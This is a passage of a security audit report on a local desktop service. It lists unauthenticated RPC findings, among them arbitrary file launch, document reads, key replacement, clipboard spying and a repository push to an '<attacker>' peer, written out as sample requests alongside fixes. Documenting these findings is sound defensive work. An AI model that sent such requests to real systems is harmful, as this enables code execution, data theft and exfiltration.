State of files in scope: files were edited during the audit (see the warning at the top). At 02:46 I re-read every in-scope file modified after 02:10 that a finding cites or depends on: `endpoint_manager.py`, `identity.py`, `client.py`, `pipeline/worker.py`, `pipeline/delivery.py`, `delivery_outbox.py`, `laravel_delivery_repository.py`, `delivery_service.py`, `event_handlers.py`, `local_task_center_routes.py` and `launch_guard.py`, plus `orch_delivery.py` and `audio_resource_delivery.py` as cross-scope.

**Read fully** — about 45 files, about 15.5k lines:
- `pyutils/laravel/`: `client.py`, `identity.py`, `endpoint_manager.py`, `delivery_outbox.py` (02:15 snapshot; lifecycle re-read at 02:37), `worker_result_delivery.py`, `delivery_diff.py`, `relay_transport.py`
- `database/`: `repositories/laravel_delivery_repository.py` (02:09 version), `schema/laravel_delivery_schema.py`
- `pyctl/`:
  - `laravel/worker_base.py`, `laravel/delivery_service.py`
  - `relay/laravel_relay_agent_service.py`
  - `terminal/terminal_service.py`, `terminal/terminal_screenshot_cache.py`
  - `agent_history/`: `pipeline/delivery.py` (both versions), `pipeline/worker.py`, `pipeline/config.py`, `pipeline/planner.py`, `tick_service.py`, `root_spool.py` (lines 1-260)
- `pyutils/common/`: `http_progress_upload.py`, `laravel_http_transport.py`, `x11_display.py`, `session_dbus.py`, `clipboard_text.py`, `gnome_shell_dbus.py`, `xdg_desktop_portal.py`, `process_restart.py`, `dev_reload.py`
- `pyutils/window/`: `linux_terminal_backend.py`, `terminal_backend.py`, `terminal_platform.py`
- `pycore/static/gnome_shell_extensions/pycore-window-bridge@core-node/` (`extension.js`, `metadata.json`)
- `pyfoundations/`: `desktop_session.py`, `serialized_worker.py`, `system_service_state.py`, `pybasecommon/commander.py`
- `pyutils/launcher/`: `launch_guard.py`, `launcher.py`, `desktop_integration.py`, `service_orchestrator.py`, `linux_desktop_user.py`
- `callmodule/rpc_routes/`: `terminal_routes.py`, `local_task_center_routes.py`, `thread_bus_routes.py`
- `pyutils/native_ui/step6_tray/appindicator_thread.py`
- root files: `pymain.py`, `pyservice.sh`
- ncore: `ncore/utils/rpc/http_rpc/libs/StaticPathResolver.js`

**Read partially** (the sections needed to trace findings):
- RPC server and startup: `pyutils/rpc_v2/{server.py, execution.py, runner.py, delivery.py}`, `pythreadpool/starters.py` (RPC starter), `callmodule/config.py`, `pyctl/runtime/{callmodule_config.py, event_handlers.py}`, `pycore_module_caller.py`, `pyservice.ps1` (launch and `finally`)
- terminal: `pyctl/terminal/{terminal_state_repository.py 1-200, terminal_scheduler.py 1-130}`
- relay: `pyctl/relay/laravel_relay_operation_processor.py` (lines 1-140), `pyutils/common/relay_identity.py` (`signed_headers`), `relay_contract.py` (canonicalization)
- delivery layer: `pyutils/laravel/progress_upload.py`, `pyctl/laravel/sync/media_sync_http.py`
- codesync: `runtime.py`, `push_receiver.py`, `workspace_auth.py`, `workspace_exchange.py`, `callmodule/rpc_routes/code_sync_routes.py`
- `pyctl/agent_history/ui_service.py` (lines 1-140)
- `pyctl/queue_center/{task_center_service.py, snapshot_service.py (map only)}`
- `pyfoundations/`: `file_lock.py`, `pg_sync_adapter.py`, `app_config_path.py`, `core_node_dirs.py`, `system_paths.py` (`_ensure_dir`), `agent_home_scanner.py`, `python_package_policy.py`, `third_party/{_cache.py, _getters_core.py}` (Xlib/jeepney)
- `pyutils/common/user_data_store.py`
- launcher: `pyutils/launcher/{linux_terminal_launcher.py, explorer_executor.py}`, `pyutils/launcher/background_runner.py`
- native UI and tray: `pyutils/native_ui/step4_startup/startup_tray_runner.py`, `step6_tray/appindicator_system_tray.py`, `pylauncher/tray_menu.py`
- `pyctl/translation/worker/worker.py` (lines 180-310)
- `pyutils/ensure_library/ffmpeg_installer.py`, `pyfoundations/secret_manager.py`, `pyfoundations/process_manager.py` (call sites only)
- ncore: `ncore/foundation/common/commander.js`, `ncore/utils/mcp_server/SingleInstanceManager.js`

**Whole-scope static sweeps** (`pycore/` minus audio-tts):
- `shell=True` / `os.system`;
- blocking calls inside `async def` (only `pyutils/device/scrcpy_server_manager.py` hit: `subprocess.run` in async methods — not reported, minor);
- text file I/O without an encoding (13 hits, none material);
- outbox API consistency (AST + regex, clean at 02:37).

**Not read — focus list** (about 145 of 218 files):
- launcher: `app_finder`, `app_slots`, `menu`, `window_launcher`, `screen_manager`, `grid_profile`, `config_manager`, `launcher_text`, `linux_terminal_argv`, `linux_window_placer`, `char_size_measurer`, `editor_launcher`, `device_sync/*`, `shortcut_check.ps1`
- pylauncher: `system_service_manager`, `windows_startup_manager`, `linux_startup_manager`, `tray_codesync_cache`
- pyfoundations: `system_paths` (rest), `pygvar`, `machine_id`, `system_info`, `third_party/{_deps, api, _ocr_models, _torch_cuda}`, `compute_caps`, `service_contract`, `network_constants`, `timed_input`, `thread_bus_constants`, `punctuation_markers`
- pyctl: `ai/*` (every file), `assist/*`, `capabilities.py`, `desktop/capability_service.py`, `runtime/{user_data_service, system_settings_service, user_data_models}`, `corebook/translate.py`, `translation/ai_batch_translate.py`
- pyctl/agent_history: the extractors, `prompt_*` services and caches, `article_stages`, `audio_rebuild`, `heartbeat`, `agent_history_service`, `agent_history_fragments`/`agent_history_txt`
- pyutils:
  - `window/{ops, screen_capture, windows_terminal_backend, win32_window_constants}`
  - `native_ui/*` (except the tray pieces above)
  - `desktop/*`, `clipboard/clipboard_monitor.py`, `external_apis/*`, `media_processing/ffmpeg_ops.py`, `common/ffmpeg/*`
  - `common/{llm_content, strtools/normalization, engine_language_options, queue_center_contract, service_config}`, `common/python_env/*`
  - `whisper_stt`, `stt`, `ocr_cluster`, `translator/dictionary`, `voc_annotator`, `device/scrcpy_init`, `document_processing`
  - `codesync/{manager, panel}`, `agent_history/article_records.py`, `laravel/article_contract.py`
- callmodule: `callmodule_main.py`, `rpc_routes/{local_audio_orchestration_routes, route_names, local_agent_history_routes, word_audio_full_sync_routes, local_queue_head_routes, register_http_routes, local_dictionary_routes}`
- database: `database/__init__.py`, `models/{namespaces, table_keys}` (lookup only)
- ncore focus files: `placeholder_image_generator/main.py`, `ai_collaboration/constants.py`, `system_paths.js`, `watchf.js`, `user_settings.js`, `config_tool.js`, `DeepSeekTranslator.js`, `lang_deploy/libs/commander.js`, `winget.js`, `apt_utils.js`, `gconfig.js`, `ffinder.js`, `cache_manager.js`, `globaldir.js`

**Not read — rest of scope:**
- `ncore/` apart from the three files above (about 150k lines);
- pycore modules outside the focus list and the board-task paths above;
- relay V2 beyond the agent, transport and signing paths;
- codesync beyond the receive, workspace and runtime paths.

---

## Addendum (pass 2)

Scope: the pycore focus files not read in pass 1. ncore moved to the `ncore` teammate. Findings from PR-030 up, most severe first. The same rules apply: report only, static reading only.

### PR-030 — `ui/video_extract/open` launches any client-supplied path with the OS default handler (`os.startfile` / `xdg-open`), which is unauthenticated code execution.
- severity: high · category: security · confidence: confirmed
- location: `pycore/callmodule/rpc_routes/local_video_extract_routes.py:27-28` → `pycore/pyctl/desktop/video_extract_service.py:85-99` → `pycore/pyfoundations/system_launcher.py:23-34,60-69`
- failure scenario: The route has the same missing authentication and exposure as PR-001. `POST /api/ui/video_extract/open {"kind":"file","path":"C:\\Windows\\System32\\cmd.exe"}` runs `os.startfile(path)` on Windows. An `.exe`, `.bat`, `.lnk` or `.ps1`, or a UNC path such as `\\\\host\\share\\x.exe`, launches as the logged-in user. On Linux, `xdg-open` runs the file's registered handler, and a `.desktop` file runs its `Exec` line in several desktop environments.

  Combined with PR-003 (write any repo file through the CodeSync secret), this is: drop a payload, then execute it. `kind` is only checked against `{"file","subtitle"}` / `{"file_dir",…}`. `path` is not restricted to video outputs.
- evidence: `ok = system_launcher.open_file(path)` with `path = (request.path or "").strip()` straight from the RPC body. `open_file` → `_launch_path` → `os.startfile(p)`.
- suggested fix: Accept only paths inside known video-extract output roots (resolve them, then check containment), open directories only, and never shell-execute files. Also fix the PR-001 authentication.

### PR-031 — Other unauthenticated routes read any document on the host and rewrite security-relevant settings.
- severity: high · category: security · confidence: confirmed
- location:
  - `pycore/callmodule/rpc_routes/local_books_routes.py:25-80` → `pyctl/corebook/books_service.py:134-260` (`scan` / `analyze` / `list_items` take any `path`);
  - `local_ai_keys_routes.py` → `pyctl/ai/key_service.py:53-89` (`set_key` / `delete_key`);
  - `management_control_routes.py` (`set_autostart`);
  - `local_user_data_routes.py` → `pyctl/runtime/user_data_service.py:108-129` (`set_system_settings` replaces the whole section);
  - `local_audio_orchestration_routes.py:13-19` (`auth_login` with a client `laravel_base_url`);
  - `word_audio_full_sync_routes.py:270-277` (full sync against a client `base_url`);
  - `code_sync_routes.py:214-217` (`add_peer`, `set_role`).
- failure scenario: The PR-001 exposure applies to all of these.
  - (a) `ui/books/analyze {"path":"/home/user","preview_chars":1000000}` or `ui/books/list` returns the extracted text of every `.txt/.md/.pdf/.docx/.doc/.epub/.html/.rtf` under any readable directory (`book_processor.py:72`).
  - (b) `ui/ai_keys/set_key` replaces the user's AI provider keys with the attacker's, so the user's prompts and agent-history articles go to an account the attacker controls. `delete_key` disables AI.
  - (c) `ui/control/set_autostart` toggles boot auto-start.
  - (d) `ui/user_data/set_system_settings` overwrites the whole settings section with arbitrary JSON (no schema check).
  - (e) `ui/audio_orch/auth/login` and `ui/queue_center/audio_lane_full_sync` make pycore log in to, or pull task lists from, an attacker-chosen base URL (SSRF, and task injection into the local queue).
  - (f) `ui/code_sync/add_peer {"host":"<attacker>","role":"client"}` (`code_sync_routes.py:214`) registers the attacker as a client peer, and a dev-role node then pushes its repository to that host (`push_sender.py:107` selects every `role == "client"` peer). `ui/code_sync/set_role` can flip this machine's role.
- evidence: No handler checks the caller. `books_service._resolve(path)` accepts any existing path. Traversal into the secret store is blocked (`secret_manager.py:371` rejects `/ \ .` and space), but overwriting a key is not.
- suggested fix: Same authentication as PR-001, plus allowlisted roots for the books paths, and schema validation for settings and base URLs (for example, only the configured Laravel endpoint catalog).

### PR-032 — `pygvar` creates `D:\.tmp` (Windows) or `/var/_core_node/_tmp` (Linux) at import with no fallback, so pycore fails to import on a Windows host without a D: drive, or on a first Linux run as a non-root user.
- severity: medium · category: windows-compat · confidence: confirmed
- location: `pycore/pyfoundations/pygvar.py:74,85,88` (`TMP_DIR.mkdir(parents=True, exist_ok=True)` at import)
- failure scenario:
  - A Windows laptop with only a C: drive: importing `pygvar` raises `FileNotFoundError: [WinError 3]`. `pygvar` is imported by 55 modules, including `desktop_integration.py` and `service_orchestrator.py`, so the launcher and the service both fail to start.
  - Linux, non-root, before the installer creates `/var/_core_node`: `PermissionError`. `core_node_dirs.get_core_node_data_dir()` has exactly this fallback (`~/core_node`) for that case, but `pygvar` bypasses it.
- evidence: `TMP_DIR = Path(r"D:\.tmp")` / `Path("/var/_core_node/_tmp")`, followed by an unconditional mkdir. The module also sets `os.environ["TEMP"]` process-wide. If a D: drive is a documented hard prerequisite for Windows installs, downgrade the Windows half.
- suggested fix: Derive TMP_DIR from `core_node_dirs` (with its fallbacks), or fall back to `tempfile.gettempdir()` when the preferred root cannot be created.

### PR-033 — Article-record writes use one temp file name per process, so concurrent writers corrupt or silently drop `index.json` / `<id>.json` updates. `[in-flight, last read 02:52]`
- severity: medium · category: race · confidence: likely
- location: `pycore/pyutils/agent_history/article_records.py:90-99` (`tmp = path.with_suffix(path.suffix + f".tmp{os.getpid()}")`), callers `save_record:334-352`, `mark_uploaded:422-448`, `mark_audio_rebuilt`, `mark_rebuild_uploaded`, `clear_rebuild_marker`, and `_align_durable_index:109-144`
- failure scenario: The pipeline worker (`save_record`), the two delivery drains (`agent_history.article` and `agent_history.article_audio` run concurrently and call `mark_uploaded` / `mark_rebuild_uploaded`) and the rebuild lane (`mark_audio_rebuilt`) all run on different threads of one process. Two writers of `index.json` open the same `index.json.tmp<pid>`, and the file ends up interleaved or truncated.
  - Either one `os.replace` installs corrupt JSON, and the next read sees no rows and falls back to a directory rebuild.
  - Or the second `os.replace` hits `FileNotFoundError`, which `except OSError` swallows, and that thread's update is lost.

  For the same `<id>.json`, a lost `uploaded` / `rebuild_uploaded` / `tts_chunked` flag causes needless re-uploads or rebuilds. On top of that, every writer rebuilds the index from a stale read (no read-modify-write serialization).
- evidence: The module comment says "Rule §4: no module-level locks" but the temp name is shared per process. It is unique per pid only, not per call or thread.
- suggested fix: Use a unique temp name per write (`uuid4`), and route index read-modify-write through one serialized owner.

### PR-034 — Turning the Linux "system service" tray toggle OFF from inside the running `pycore` unit kills its own uninstall before it disables or removes the unit.
- severity: medium · category: lifecycle · confidence: likely
- location: `pycore/pylauncher/platform/system_service_manager.py:67-80,96-107` (`_run_shell(PYCORE_SERVICE_SH, ["uninstall"])` as a child of the pycore process); script order `scripts/shells/linux/common/pycore_service.sh:237-244` (`systemctl stop` → `disable` → `rm` → `daemon-reload`)
- failure scenario: pycore runs as the `pycore` systemd unit, and the tray (or `thread_bus/trigger_event tray_action_toggle_service`, PR-021) turns it off. The uninstall script runs inside the unit's cgroup, so its first step, `systemctl stop pycore`, kills pycore and the script itself. `disable` and `rm` never run, the unit stays enabled, and pycore comes back on the next boot although the user switched it off. The tray result is never reported.
- evidence: There is no `systemd-run --scope` / `setsid` escape around `_run_shell`. `disable_pycore_only` then reports `ok = not pycore_service_enabled()` in a process that is already dead. The service_orchestrator already uses a `systemd-run --scope` escape for the same class of problem.
- suggested fix: Run the uninstall outside the unit's cgroup (`systemd-run --scope`, or ask a helper), or reorder it to `disable` → `rm` → `daemon-reload` → `stop --no-block`. The script-order half belongs to the shell owner.

### PR-035 — Windows terminal paste right-clicks the window center. In a classic console (`ConsoleWindowClass`, QuickEdit) the preceding activation click starts a selection, so the right-click copies instead of pasting, and Enter is still sent.
- severity: medium · category: correctness · confidence: likely
- location: `pycore/pyutils/window/windows_terminal_backend.py:121-130` (`_paste` = right-click), `pyutils/window/terminal_backend.py:110-120` (`activate` = left-click at the center); consoles included through `terminal_identifiers.py:3-9`
- failure scenario: The user's pycore terminal is a cmd or PowerShell conhost window with QuickEdit on (the default). `input_text` → `activate` (left-click at the center puts conhost into Select/mark mode) → `_paste` (right-click). With a selection active, conhost copies the selection and leaves mark mode, so nothing is pasted. `press_enter` then submits an empty line and the RPC reports success. The same happens in Windows Terminal whenever text is selected (a right-click with a selection copies).
- evidence: There is no keyboard paste path on Windows (compare Linux Shift+Insert), and the paste result is not verified.
- suggested fix: Paste with a keyboard shortcut (Ctrl+Shift+V in WT; for conhost, send the text with `SendInput` Unicode events), or clear any selection with Esc before the right-click.

### PR-036 — External API keys leak into logs through exception text: the Forvo key is in the URL path, and the TMDB, OMDB and SerpApi keys are in query params. These logs reach the unauthenticated `/api/events` log stream.
- severity: low · category: security · confidence: likely
- location: `pycore/pyutils/external_apis/word_audio_client.py:478-500` (Forvo `.../key/{api_key}/...`, `except Exception as exc: ColorPrint.yellow(f"... ({exc})")`); `movie_poster_client.py:225-237,303-332`; `image_search_client.py:89-114`
- failure scenario: A DNS or connection failure raises `requests.ConnectionError("HTTPSConnectionPool(host=…): Max retries exceeded with url: /key/<FORVO_KEY>/format/json/…")` (or `…?api_key=<KEY>&…`). ColorPrint logs it, and rpc_v2 forwards every log line to the SSE journal (`pycore_module_caller.py:117` registers `publish_log`), so any client of PR-001 can read the keys. The keys also persist in the pyservice console logs.
- evidence: The keys are embedded in URLs, and the raw exception strings are logged.
- suggested fix: Send keys as headers where the API allows it. Otherwise redact the URL and query from exception text before logging (log `type(exc).__name__` and the host only).

### PR-037 — An unauthenticated client can switch on the clipboard monitor and then read every clipboard change from the log stream (remote clipboard spying).
- severity: medium · category: security · confidence: likely
- location: `pycore/callmodule/rpc_routes/voice_subtitle_routes.py:37` (`ui/voice_subtitle/start_clipboard_monitor`) → `pyctl/desktop/background_services.py:119-141` → `pyutils/clipboard/clipboard_monitor.py:107-157` (`ColorPrint.blue(f"... Clipboard changed: {current_content[:50]}...")`, plus a `clipboard_history.add_item` of the full text)
- failure scenario: Through the PR-001 exposure, an attacker starts the monitor and subscribes to `/api/events`, where the ColorPrint log stream arrives (`pycore_module_caller.py:117`). Every text the user copies (passwords from a password manager, tokens) shows up there within about 1 s. The full text is also stored in clipboard history and passed to `_on_clipboard_change` → the voice-subtitle AI pipeline, so it goes to an external AI provider.

  The monitor also picks up pycore's own staged terminal inputs (PR-005 path) as "user copies".
- evidence: The monitor polls every `poll_interval=1.0` s, logs the content, and fires events with the full text.
- suggested fix: Never log clipboard content (log only its length or hash), and require authentication for the start route (PR-001).

### Pass-2 counts and coverage

**Pass 2:** high 2 (PR-030, PR-031), medium 5 (PR-032 to PR-035, PR-037), low 1 (PR-036). **Totals across both passes:** critical 1, high 7, medium 16, low 10 (34 findings). The in-flight rule was applied again: files modified after 02:10 were re-read at 02:52, and the affected findings are tagged. At 02:50–02:52 the user's session was still editing `launch_guard.py`, `service_orchestrator.py` and `system_service_state.py`; no finding depends on their changed lines beyond the anchors re-verified in PR-011 and PR-034.

**Pass-2 coverage:**
- **Read (full or the relevant handlers):**
  - HTTP routes:
    - read fully: `local_audio_orchestration_routes`, `local_queue_head_routes`, `local_dictionary_routes`, `word_audio_full_sync_routes`, `register_http_routes`, `callmodule_main.py`, and the small routes (`local_ai_keys`, `media`, `management_control`, `management_config`, `local_local_config`, `local_user_data`, `local_ai_image`, `local_video_extract`);
    - read for their path parameters: `local_books` and `local_agent_history` (plus its `ui_service` handlers);
    - reviewed with `grep`: all 53 `rpc_routes/*`, checked for path, secret and exec parameters;
    - `route_names.py` used for lookups.
  - pyctl:
    - `ai/key_service.py`; `assist/{wiring, capability_sync, assist_settings}.py`; `queue_center/lane_registry.py`
    - `desktop/capability_service.py` (settings and open paths), `desktop/video_extract_service.py` (`open`), `desktop/background_services.py` (clipboard part)
    - `runtime/{user_data_service.py (pick_path, set_system_settings), autostart_service.py}`
    - `agent_history/{agent_history_service.py (extract and live scan), prompt_transform_service.py}`
  - pyutils: `agent_history/article_records.py` (write paths), `clipboard/clipboard_monitor.py`, `desktop/system_notification.py`, `translator/dictionary.py` (queries), `common/ffmpeg/ffmpeg_runner.py`, `external_apis/*` (request and log paths), `window/windows_terminal_backend.py`, `window/ops.py` (input and topmost helpers), `native_ui/step5_main_ui/pyside6/thread_bus_bridge.py` (signal marshaling)
  - pylauncher: `platform/{startup_manager, autostart_target, linux_autostart_common, windows_startup_manager (script and shortcut generation), system_service_manager}.py`
  - pyfoundations: `pygvar.py`, `core_node_dirs.py`, `machine_id.py`, `system_launcher.py`, `secret_manager.py` (key write/delete)
  - `codesync/{service.add_peer, peer_config.add_peer}`
- **Whole-scope sweeps (pass 2):** unguarded POSIX- or Windows-only top-level imports (none found); `while True` loops without a wait (none found); all `subprocess` call sites outside the launcher, checked for `shell=True` and quoting (only `port_utils.py:119`, `lsof -ti :{int}` with a shell, with no untrusted input).
- **Still unread in pycore:**
  - pyctl/ai: every module except `key_service.py` (they were only swept for request/timeout patterns);
  - `pyctl/capabilities.py` beyond `resolve_static_dir`;
  - agent-history: the per-tool extractors (claude/codex/kimi/cursor/gemini/pi/antigravity/cline/generic), `prompt_{derive,rewrite,notify}_service`, `prompt_{transform,new}_cache`, `prompt_archive`, `article_stages`, `audio_rebuild`, `heartbeat`, `agent_history_{fragments,txt,statistics}`, `video_pipeline`;
  - launcher: `app_finder`, `menu`, `window_launcher`, `screen_manager`, `linux_screen_manager`, `grid_profile`, `config_manager`, `launcher_text`, `linux_terminal_argv`, `linux_window_placer`, `char_size_measurer`, `editor_launcher`, `script_generator`, `device_sync/*`, `shortcut_check.ps1`;
  - pylauncher: `linux_startup_manager`, `systemd_user_startup_manager`, `tray_codesync_cache`;
  - pyutils: `common/python_env/*`, `media_processing/ffmpeg_ops.py`, `common/ffmpeg/*` apart from the runner, `window/screen_capture.py`, `whisper_stt`, `stt`, `ocr_cluster`, `voc_annotator`, `device/scrcpy_init`, `document_processing/*`;
  - native UI: `native_ui/*` (`platform_adapter`, i18n, the win32/tkinter/appindicator trays, `window_state`), `desktop/{toast_stack, tk_taskbar}`;
  - pyfoundations: `third_party/*` beyond the lazy-import path, `system_info`, `compute_caps`, `python_package_policy` beyond the maps, `service_contract`, `timed_input`, `punctuation_markers`, `thread_bus_constants`;
  - `codesync/{manager, panel}`, `database/__init__.py`, `pythreadpool/starters.py` beyond the RPC starter;
  - the non-focus remainder of pycore.
